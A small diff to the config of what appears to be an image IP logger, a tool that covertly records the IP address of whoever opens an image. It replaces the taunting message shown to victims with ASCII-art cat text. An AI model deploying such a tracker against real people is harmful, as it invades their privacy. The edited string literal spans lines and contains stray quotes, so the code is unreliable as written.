@@ -28,7 +28,12 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
-        "message": "u just got ip logged boi", # Message to show
+        "message": "   |\---/|
+   | ,_, |
+    \_`_/-..----.
+ ___/ `   ' ,""+ \  
+(__...'   __\    |`.___.';
+  (_,...'(_,.`__)/'.....+", # Message to show
         "richMessage": False, # Enable rich text? (See README for more info)
     },
 
